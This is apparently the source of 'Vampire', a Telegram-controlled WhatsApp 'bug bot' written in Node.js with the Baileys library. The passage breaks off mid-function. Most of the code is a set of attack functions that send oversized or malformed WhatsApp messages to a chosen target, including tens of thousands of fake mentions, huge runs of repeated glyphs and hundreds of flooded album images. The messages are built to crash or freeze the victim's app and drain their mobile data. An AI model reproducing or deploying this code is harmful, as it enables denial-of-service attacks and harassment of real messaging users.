const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  proto,
  generateWAMessage,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const VampCrash = fs.readFileSync('./MediaBUG/Picture/thumb.jpeg');
const path = require("path");
const JsConfuser = require('js-confuser');
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function generateRandomMessageId() {
  return 'BUG_' + Math.floor(Math.random() * 1000000000).toString(36);
}

let premiumUsers = JSON.parse(fs.readFileSync('./VampDB/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./VampDB/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./VampDB/premium.json');
ensureFileExists('./VampDB/admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./VampDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./VampDB/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./VampDB/premium.json', (data) => (premiumUsers = data));
watchFile('./VampDB/admin.json', (data) => (adminUsers = data));


function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VampirePrivate/VampEmosi/refs/heads/main/VampTok.json"; // Ganti dengan URL GitHub raw JSON langsung array

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data)) {
      return response.data; // langsung array
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Harus array token"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("LU SIAPA NGENTOT!!!\nTOKEN LU GAK ADA DI DATABASE:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token Tidak Di Terima Oleh Bot!!!"));
    process.exit(1);
  }

  console.log(chalk.green("Token Anda Di Kenali Vampire!!!"));
  startBot();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
█░█ ▄▀█ █▀▄▀█ █▀█ █ █▀█ █▀▀
▀▄▀ █▀█ █░▀░█ █▀▀ █ █▀▄ ██▄

░█▄▄ █▀█ ▀█▀
░█▄█ █▄█ ░█░
Created By : Iqbhal Keifer
Version : 12.0
License : Meta
Limited Edition Style Base Home`));
}

validateToken();

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba Reconnecting WhatsApp : ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Nomor Ini ${botNumber} Berhasil terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba Menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("🔴 Disconnected"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `Device : ${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nomor : ${botNumber} 
┃ Statistic : Instalasii... 
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nᴜᴍʙᴇʀ : ${botNumber} 
┃ Lᴏᴀᴅ : Try Connected.
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nᴜᴍʙᴇʀ : ${botNumber} 
┃ Lᴏᴀᴅ : 🔴 Gagal Terhubung...
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nᴜᴍʙᴇʀ : ${botNumber} 
┃ Lᴏᴀᴅ : 🟢 Connected 
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nᴜᴍʙᴇʀ : ${botNumber} 
┃ Yᴏᴜʀ Cᴏᴅᴇ : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`
┏━━━⪩ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 ⪨━━━┓
┃ Nᴜᴍʙᴇʀ : ${botNumber} 
┃ Mᴇssᴀɢᴇ : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


const grupConfig = require('./MediaBUG/Group.json');

const updateGrupOnly = (status) => {
    grupConfig.grupOnly = status;
    fs.writeFileSync('./Group.json', JSON.stringify(grupConfig, null, 2));
};

bot.onText(/\/Groupset (on|off)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!config.OWNER_ID.includes(userId.toString())) {
        return bot.sendMessage(chatId, "❌ Elu Bukan Owner Tolol!!!");
    }

    const mode = match[1] === 'on';
    updateGrupOnly(mode);

    bot.sendMessage(chatId, `✅ Grup Only mode ${mode ? 'Diaktifkan' : 'Dimatikan'}!`);
});

// [ BUG FUNCTION ]
async function VampSedotKuota(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 30000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.red("֮Vampire Success Sending Bug"));
}

async function VampBlankBroadcast(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 30000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.red("Vampire Success Sending Bug"));
}    

async function VampDelayTotal(sock, target, mention) {
  const photo = {
    image: VampCrash,
    caption: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 Here Bro"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: sock.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Ugly Kids 𝗩𝗮𝗺𝗽𝗶𝗿𝗲",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
  console.log(chalk.red("Success Sending Delay Blank Bug"));
}

async function VampBrutalDelay(sock, target) {
    let listMessage = {
        title: "Vamp.com",
        sections: [],
        description: "",
        buttonText: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲",
    };

    for (let i = 0; i < 9999; i++) {
        const largeText = "ꦾ".repeat(99999); 

        listMessage.sections.push({
            title: `OverLoad ${i}`,
            rows: [
                {
                    title: largeText,
                    rowId: `crazy_payload_${i}`,
                    description: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲!!!",
                },
            ],
        });
    }

    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: "shut Up Bitch\n" + "ꦾ".repeat(99999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "Vamp Crash",
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify(listMessage),
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
                                },
                            ],
                        }),
                    }),
                },
            },
        },
        { userJid: target }
    );

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });

    console.log(chalk.red.bold('Succes Sending bug'));
}

async function VampButtonUi(sock, target, Ptcp = true) {
      await sock.relayMessage(target, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Vamp.zip",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 Syariah\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'BlackOwlBOT', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Vamp.doc",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
      console.log(chalk.red("Vampire Success Sending Bug"));
}


        async function VampNewAttack(sock, target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗦𝗸𝗿𝗿𝗿𝘁𝘁",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝗛𝗼𝗮𝗮𝗮𝗺𝗺𝘇𝘇𝘇" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵐᵃʳᵏ ᶻᵘᶜᵏᵉʳᵇᵉʳᵍ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("Vampire - BuGBoT"));
        }
        async function VampNewCrash(sock, target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗛𝗮𝗱𝗶𝗿𝗿𝗿",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝐇𝐮𝐰𝐚𝐚𝐚𝐚𝐚" + "ꦽ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ⁿᵉᵛᵉʳ ˡᵒˢᵗ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ʳᵃⁿˢᵒᵐᵉʷᵃʳᵉ ᵇᵒᵗⁿᵉᵗ.ᶦᵈ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("Vampire - BuGBoT"));
        }
        
async function VampireUi(sock, target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲" + "ꦽ".repeat(10000) + "꧀".repeat(10000) + '@5'.repeat(5000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

        async function SafariCall(sock, target, Ptcp = true) {
			await sock.relayMessage(target, {
					"extendedTextMessage": {
						"text": "ini nomor saya : +6285769675679 +6283197657804 +6285182925393" + "𑇂𑆵𑆴𑆿".repeat(60000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6285769675679@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6285769675679@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6285769675679@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "ini nomor saya : +6285769675679 +6283197657804 +6285182925393",
								"body": "ini nomor saya : +6285769675679 +6283197657804 +6285182925393",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
